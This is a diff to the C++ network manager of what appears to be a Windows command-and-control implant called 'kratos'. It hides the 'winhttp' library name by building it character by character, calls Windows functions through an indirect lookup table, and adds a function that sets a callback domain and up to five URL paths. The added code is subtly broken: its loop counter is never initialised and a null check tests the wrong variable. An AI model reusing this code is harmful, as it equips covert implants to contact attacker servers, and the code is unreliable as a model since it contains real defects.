@@ -6,6 +6,9 @@ NetMgr* net = NULL;
 #define RECV_INTIAL_SIZE (64*1024)
 #define RECV_MAX_SIZE    (1024 * 1024)
 
+
+#define ARRAY_SIZE(a) (sizeof(a) / sizeof(a)[0])
+
 NetMgr::NetMgr() {
 	CHAR dll[ 12 ];
 	dll[  0  ]  = 'w';
@@ -35,16 +38,14 @@ NetMgr::NetMgr() {
 	}
 	else {
 		DEBUG_LOG("[!] Failed loading winhttp");
-
-		//return FALSE;
 	}
 
 	this->RecvBuf = ( PBYTE )kratos->apis.LocalAlloc( ALLOC_ARGS, RECV_INTIAL_SIZE );
-	//if ( ! this->RecvBuf ) { return FALSE; }
 	this->recvLen = 0;
 	this->recvCap = RECV_INTIAL_SIZE;
+	utils::mem::memset(this->Paths, 0, sizeof(this->Paths));
 
-	//return TRUE;
+
 }
 
 
@@ -143,4 +144,41 @@ PBYTE NetMgr::Data( ) {
 
 SIZE_T NetMgr::DataSize( ) {
 	return this->recvLen;
+}
+
+
+BOOL NetMgr::SetHttpConfig(INT32 TotalDomains, PCHAR Domain, PCHAR* Paths) {
+
+	INT size = kratos->apis.MultiByteToWideChar(CP_UTF8, 0, Domain, -1, NULL, 0);
+	if ( size == 0 ) { return FALSE; }
+
+	this->Domain = (PWCHAR)kratos->apis.LocalAlloc( ALLOC_ARGS, size * sizeof( WCHAR ) );
+
+	if ( ! kratos->apis.MultiByteToWideChar(CP_UTF8, 0, Domain, -1, this->Domain, size ) ) {
+		kratos->apis.LocalFree( this->Domain );
+		return FALSE;
+	}
+
+	if (TotalDomains < 0 || TotalDomains > 5) {
+		kratos->apis.LocalFree( this->Domain );
+		return FALSE;
+	}
+
+	if (TotalDomains > 0 && this->Paths == NULL) {
+		kratos->apis.LocalFree( this->Domain );
+		return FALSE;
+	}
+
+	for (INT32 i; i < TotalDomains; i++) {
+		if (this->Paths[i] == NULL) {
+			kratos->apis.LocalFree( this->Domain );
+			return FALSE;
+		}
+
+		if (!kratos->apis.MultiByteToWideChar(CP_UTF8, MB_ERR_INVALID_CHARS, Paths[i], -1, this->Paths[i], ARRAY_SIZE(this->Paths[i]))) {
+			kratos->apis.LocalFree( this->Domain );
+			return FALSE;
+		}
+	}
+	return TRUE;
 }
